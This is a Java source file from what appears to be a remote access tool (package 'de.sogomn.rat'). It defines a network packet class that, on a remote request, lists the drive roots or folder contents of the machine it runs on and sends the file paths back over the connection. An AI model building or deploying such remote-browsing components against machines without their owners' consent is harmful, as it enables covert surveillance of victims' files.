package de.sogomn.rat.packet;

import java.io.File;
import java.util.ArrayList;
import java.util.stream.Stream;

import de.sogomn.rat.ActiveConnection;

public class FileSystemPacket extends AbstractPingPongPacket {
	
	private String rootFile;
	
	private String[] paths;
	
	private static final byte INCOMING = 1;
	private static final byte END = 0;
	
	public FileSystemPacket(final String rootFile) {
		this.rootFile = rootFile;
		
		type = REQUEST;
		paths = new String[0];
	}
	
	public FileSystemPacket() {
		this("");
		
		type = DATA;
	}
	
	@Override
	protected void sendRequest(final ActiveConnection client) {
		client.writeUTF(rootFile);
	}
	
	@Override
	protected void sendData(final ActiveConnection client) {
		for (final String path : paths) {
			client.writeByte(INCOMING);
			client.writeUTF(path);
		}
		
		client.writeByte(END);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection client) {
		rootFile = client.readUTF();
	}
	
	@Override
	protected void receiveData(final ActiveConnection client) {
		final ArrayList<String> pathList = new ArrayList<String>();
		
		while (client.readByte() == INCOMING) {
			final String path = client.readUTF();
			
			pathList.add(path);
		}
		
		paths = new String[pathList.size()];
		paths = pathList.toArray(paths);
	}
	
	@Override
	protected void executeRequest(final ActiveConnection client) {
		final File[] children;
		
		if (rootFile.isEmpty() || rootFile.equals(File.separator)) {
			children = File.listRoots();
		} else {
			final File file = new File(rootFile);
			
			children = file.listFiles();
		}
		
		if (children != null) {
			paths = Stream
					.of(children)
					.map(File::getAbsolutePath)
					.toArray(String[]::new);
		}
		
		type = DATA;
		client.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection client) {
		//...
	}
	
	public String[] getPaths() {
		return paths;
	}
	
}
